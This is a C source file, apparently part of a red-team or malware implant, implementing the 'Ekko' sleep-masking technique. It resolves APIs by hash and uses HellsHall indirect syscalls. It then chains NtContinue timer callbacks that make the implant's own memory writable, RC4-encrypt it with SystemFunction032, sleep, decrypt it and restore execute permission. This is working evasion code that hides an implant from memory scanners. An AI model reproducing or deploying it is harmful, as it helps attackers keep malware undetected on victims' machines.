#include <Core.h>
#include <Win32.h>
#include <Structs.h>
#include <HellsHall.h>
#include <Sleep.h>
#include <Utils.h>

SEC( text, C ) VOID Ekko ( DWORD SleepTime)

{
    #define NT_SUCCESS(Status) ( (NTSTATUS)(Status) >= 0 )
    #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
    #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
    
    INSTANCE Instance = { 0 };
    
    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    Instance.Win32.LoadLibraryA = LdrFunction (Instance.Modules.Kernel32, 0xb7072fdb);
    
    Instance.Modules.Msvcrt     = Instance.Win32.LoadLibraryA( "msvcrt.dll" );
    Instance.Modules.Cryptsp     = Instance.Win32.LoadLibraryA( "cryptsp.dll" );

    Instance.Win32.RtlCaptureContext = LdrFunction (Instance.Modules.Kernel32, 0xeba8d910);

    Instance.Win32.printf = LdrFunction (Instance.Modules.Msvcrt, 0xc870eef8);

    Instance.Win32.NtContinue = LdrFunction (Instance.Modules.Ntdll, 0xfc3a6c2c);
    Instance.Win32.NtWaitForSingleObject  = LdrFunction (Instance.Modules.Ntdll, 0xe8ac0c3c);
    Instance.Win32.NtSetEvent = LdrFunction (Instance.Modules.Ntdll, 0xcb87d8b5);
    Instance.Win32.NtCreateEvent = LdrFunction (Instance.Modules.Ntdll, 0x28d3233d);
    Instance.Win32.RtlCreateTimerQueue = LdrFunction (Instance.Modules.Ntdll, 0x50ef3c31);
    Instance.Win32.RtlCreateTimer = LdrFunction (Instance.Modules.Ntdll, 0x1877faec);
    Instance.Win32.RtlDeleteTimerQueueEx = LdrFunction (Instance.Modules.Ntdll, 0xa5467ded);

    Instance.Win32.SystemFunction032 = LdrFunction (Instance.Modules.Cryptsp, 0xe58c8805);

    CONTEXT CtxThread   = { 0 };
    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    DWORD   OldProtect  = 0x6969;

    // Can be randomly generated
    CHAR    KeyBuf[ 16 ]= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    USTRING Key = { 0 };
    USTRING Img  = { 0 };

    PVOID   NtContinue  = NULL;
    PVOID   SysFunc032  = NULL;
     
    Instance.Win32.NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 0, 0 ); //For 4th arg, NotificationEvent = 0
    Instance.Win32.RtlCreateTimerQueue( &hTimerQueue) ; // https://doxygen.reactos.org/d8/dd5/ndk_2rtlfuncs_8h.html#a3c33cfe4a773cc54ead6d284427bc12c

#if defined  ISEXE || defined  ISDLL
    ImageBase   = KaynCaller();
    ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
#endif

#if defined ISPIC
    ImageBase   = (PBYTE)((SIZE_T)Entry - 0x20); // I would use start, but it returns 0 for some reason. So 0x20 below Entry it is.
    ImageSize   =  (PVOID)( (SIZE_T)GetRIPEnd) - ImageBase; //Theres a few bytes at the end that this misses but thats fiiiiiine right?
#endif

    Instance.Win32.printf( "[INFO] ImageBase is 0x%llx\n", ImageBase );
    Instance.Win32.printf( "[INFO] ImageSize is 0x%llx\n", ImageSize );

    Key.Buffer  = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    Img.Buffer  = ImageBase;
    Img.Length  = Img.MaximumLength = ImageSize;
    
    
    // https://doxygen.reactos.org/df/d53/dll_2win32_2kernel32_2client_2timerqueue_8c.html#a1a76d5f2b6b93fd0dbfe0571cd03effd
    if ( Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
    { 
        LARGE_INTEGER li = { 0 };
        li.QuadPart    = (long)-1000000L * ( (long)5 ); //-10000000L = 1 second, so this should be 50 miliseconds
        Instance.Win32.NtWaitForSingleObject( hEvent, 0, &li );

        CopyMemoryEx( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
        CopyMemoryEx( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
    
        /* Using HellsHall to allocate memory for the stub to be copied*/
        MyStruct    S           = { 0 };
        NTDLL       NtdllSt     = { 0 };
        SysFunc     sF          = { 0 };
        InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b, &NtdllSt, &sF);
        getSysFuncStruct(&S.NtAllocateVirtualMemory, &sF);
        InitilizeSysFunc(NtFreeVirtualMemory_CRC32b, &NtdllSt, &sF);
        getSysFuncStruct(&S.NtFreeVirtualMemory, &sF);

        
        PVOID CopiedProtStub = NULL;
        SIZE_T StubSize = (SIZE_T)GetRIPE - (SIZE_T)ProtStub;

        SetConfig(S.NtAllocateVirtualMemory.wSSN, S.NtAllocateVirtualMemory.pInst);
        HellHall(NtCurrentProcess(), &CopiedProtStub, 0, &StubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        StubSize = (int)GetRIPE - (int)ProtStub;                       // Alloc likes to fuck with this so let's set it back to its true value
        CopyMemoryEx( CopiedProtStub, &ProtStub, StubSize);
        
        PVOID temp = NULL;

        InitilizeSysFunc(NtProtectVirtualMemory_CRC32b, &NtdllSt, &sF); // I wanted to put this above BUT FUCKING OPTIMIZATION KILLED MY SHIT
        getSysFuncStruct(&S.NtProtectVirtualMemory, &sF);
        SetConfig(S.NtProtectVirtualMemory.wSSN, S.NtProtectVirtualMemory.pInst);
        HellHall(NtCurrentProcess(), &CopiedProtStub, &StubSize, PAGE_EXECUTE_READ, &temp);

        StubSize = (int)GetRIPE - (int)ProtStub; 
        Instance.Win32.printf( "Check stub integrity at 0x%llx\n", CopiedProtStub);

        SIZE_T ProtectionRange = (SIZE_T)ImageSize; // Gotta love how size matters :(. 8 byte ptr to int != 8 byte ptr to 8 byte num
        SIZE_T ProtectionRange2 = (SIZE_T)ImageSize; // Declare 2 of these, one for each instance. Since ntprotect will change them up during rop
        ProtStubArgs ProtArgs = { 0 };
        ProtArgs.StackArgs = 1;
        ProtArgs.Args[0] = NtCurrentProcess();
        ProtArgs.Args[1] = &ImageBase;
        ProtArgs.Args[2] = &ProtectionRange;
        ProtArgs.Args[3] = PAGE_READWRITE;
        ProtArgs.Args[4] = &OldProtect;
        RopProtRW.Rsp  -= 8;
        RopProtRW.Rcx   = &ProtArgs;
        RopProtRW.Rip   = CopiedProtStub;
        RopProtRW.R10   = S.NtProtectVirtualMemory.wSSN;
        RopProtRW.R11   = S.NtProtectVirtualMemory.pInst;
        
        // SystemFunction032( &Key, &Img );

        RopMemEnc.Rsp  -= 8;
        RopMemEnc.Rip   = Instance.Win32.SystemFunction032;
        RopMemEnc.Rcx   = &Img;
        RopMemEnc.Rdx   = &Key;

        // NtWaitForSingleObject( hTargetHdl, BOOL alert?, PLARGE_INTEGER SleepTime );
        
        li.QuadPart    = (long)-10000000L * ((long)SleepTime / 1000 ); // -10000000L = 1 second, and our sleeptime is in milliseconds
        RopDelay.Rsp   -= 8;
        RopDelay.Rip    = Instance.Win32.NtWaitForSingleObject;
        RopDelay.Rcx    = NtCurrentProcess();
        RopDelay.Rdx    = 0;
        RopDelay.R8     = &li;
        

        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp  -= 8;
        RopMemDec.Rip   = Instance.Win32.SystemFunction032;
        RopMemDec.Rcx   = &Img;
        RopMemDec.Rdx   = &Key;
        
        ProtStubArgs ProtArgs2 = ProtArgs;
        ProtArgs2.Args[2] = &ProtectionRange2;
        ProtArgs2.Args[3] = PAGE_EXECUTE_READ;
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rcx   = &ProtArgs2;
        RopProtRX.Rip   = CopiedProtStub;
        RopProtRX.R10   = S.NtProtectVirtualMemory.wSSN;
        RopProtRX.R11   = S.NtProtectVirtualMemory.pInst;

        // SetEvent( hEvent );
        RopSetEvt.Rsp  -= 8;
        RopSetEvt.Rip   = Instance.Win32.NtSetEvent;
        RopSetEvt.Rcx   = hEvent;
        RopSetEvt.Rdx   = NULL;
        
        Instance.Win32.printf( "[INFO] Queue timers\n" );
        
        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

        Instance.Win32.printf( "[INFO] Wait for hEvent\n" );

        Instance.Win32.NtWaitForSingleObject( hEvent, 0, NULL );

        Instance.Win32.printf( "[INFO] Finished waiting for event\n" );

        temp = NULL;
        SetConfig(S.NtFreeVirtualMemory.wSSN, S.NtFreeVirtualMemory.pInst);
        NTSTATUS status = HellHall((HANDLE)-1, &CopiedProtStub, &temp, MEM_RELEASE); // free the stub completely
        Instance.Win32.printf("Free Status is 0x%llx\n", status);
    }

    Instance.Win32.RtlDeleteTimerQueueEx( hTimerQueue, 0 );

}